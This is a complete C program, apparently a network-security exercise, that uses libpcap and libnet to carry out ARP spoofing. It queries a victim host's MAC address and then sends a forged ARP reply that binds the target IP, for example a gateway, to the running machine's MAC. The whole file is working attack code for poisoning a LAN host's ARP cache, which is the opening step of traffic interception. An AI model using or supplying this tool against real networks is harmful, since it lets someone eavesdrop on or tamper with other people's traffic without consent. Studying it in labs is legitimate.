#include <pcap.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <libnet.h>

#define ARPPRO_IPV4 0x0800
#define IP_ADDR_LEN 4
#define ARP_PACKET_LEN 42	//eth_h 14 + arp_h 8 + arp_a 20

struct arp_addr{
	uint8_t ar_sha[ETHER_ADDR_LEN];	//source hw addr
	uint8_t ar_sip[IP_ADDR_LEN];	//source ip addr
	uint8_t ar_tha[ETHER_ADDR_LEN];	//target hw addr
	uint8_t ar_tip[IP_ADDR_LEN];	//target ip addr
};

void usage(){
	printf("syntax: send_arp <interface> <sender ip> <target ip>\n");
	printf("sample: send_arp ens33 192.168.10.20 192.168.10.1\n");
}

int send_arp(pcap_t * handle, uint16_t op, uint8_t* eth_src, uint8_t* eth_dst, uint8_t* arp_sha, uint8_t* arp_sip, uint8_t* arp_tha, uint8_t* arp_tip){	
	uint8_t buf[ARP_PACKET_LEN];
	struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)buf;
	struct libnet_arp_hdr * arp_h = (struct libnet_arp_hdr*)(eth_h+1);
	struct arp_addr * arp_a = (struct arp_addr*)(arp_h+1);
	
	for (int i=0; i<ETHER_ADDR_LEN; i++){
		eth_h -> ether_dhost[i] = eth_dst[i];
		eth_h -> ether_shost[i] = eth_src[i];
	}
	eth_h -> ether_type = htons(ETHERTYPE_ARP);
	
	arp_h -> ar_hrd = htons(ARPHRD_ETHER);
	arp_h -> ar_pro = htons(ARPPRO_IPV4);
	arp_h -> ar_hln = ETHER_ADDR_LEN;
	arp_h -> ar_pln = IP_ADDR_LEN;
	arp_h -> ar_op = htons(op);
	for (int i=0; i<ETHER_ADDR_LEN; i++){
		arp_a -> ar_sha[i] = arp_sha[i];
		arp_a -> ar_tha[i] = arp_tha[i];
	}
	for (int i=0; i<IP_ADDR_LEN; i++){
		arp_a -> ar_sip[i] = arp_sip[i];
		arp_a -> ar_tip[i] = arp_tip[i];
	}

	if (pcap_sendpacket(handle, buf, ARP_PACKET_LEN) == -1){
		printf("failed to send\n");
		return -1;
	}

	return 1;
}

int recv_arp(pcap_t* handle, uint8_t* sender_mac){
	while (true) {
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2){
			printf("error while reading packet\n");
			return -1;
		}

		struct libnet_ethernet_hdr * eth_h = (struct libnet_ethernet_hdr*)packet;
		if (ntohs(eth_h -> ether_type) != ETHERTYPE_ARP) continue;

		struct libnet_arp_hdr * arp_h = (struct libnet_arp_hdr*)(eth_h+1);
		if (ntohs(arp_h -> ar_op) != ARPOP_REPLY) continue;

		struct arp_addr * arp_a = (struct arp_addr*)(arp_h+1);
		for (int i=0; i<ETHER_ADDR_LEN; i++)
			sender_mac[i] = arp_a -> ar_sha[i];
		
		return 1;
	}
}

int get_my_addr(const char* dev, uint8_t * my_mac, uint8_t* my_ip){
	struct ifreq ifrq;
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	
	strcpy(ifrq.ifr_name, dev);

	if (ioctl(s,SIOCGIFHWADDR, &ifrq) <0) {
		printf("failed to get mac addr\n");
		return -1;
	}
	for (int i=0; i<ETHER_ADDR_LEN; i++)
		my_mac[i] = ifrq.ifr_hwaddr.sa_data[i];

	if (ioctl(s, SIOCGIFADDR, &ifrq) <0) {
		printf("failed to get ip addr\n");
		return -1;
	}
	*(in_addr*)my_ip = ((sockaddr_in*)&ifrq.ifr_addr)->sin_addr;
	
	close(s);
	return 1;
}

int main(int argc, char * argv[]){
	if (argc != 4){
		usage();
		return -1;
	}
	
	char errbuf[PCAP_ERRBUF_SIZE];
	char * dev = argv[1];
	uint8_t brdcst_mac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
	uint8_t zero_mac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
	uint8_t my_mac[6], sender_mac[6];
	uint8_t my_ip[4], sender_ip[4], target_ip[4];
	
	pcap_t * handle = pcap_open_live(dev,BUFSIZ,1,1000,errbuf);
	if (handle == NULL) {
		fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
		return -1;
	}

	inet_pton(AF_INET, argv[2], sender_ip);
	inet_pton(AF_INET, argv[3], target_ip);
	
	if (get_my_addr(dev, my_mac, my_ip) == -1) return -1;
	if (send_arp(handle, ARPOP_REQUEST, my_mac, brdcst_mac, my_mac, my_ip, zero_mac, sender_ip) == -1) return -1;
	if (recv_arp(handle, sender_mac) == -1) return -1;
	if (send_arp(handle, ARPOP_REPLY, my_mac, sender_mac, my_mac, target_ip, sender_mac, sender_ip) == -1) return -1;
	
	printf("Done\n");
	pcap_close(handle);
	return 0;
}

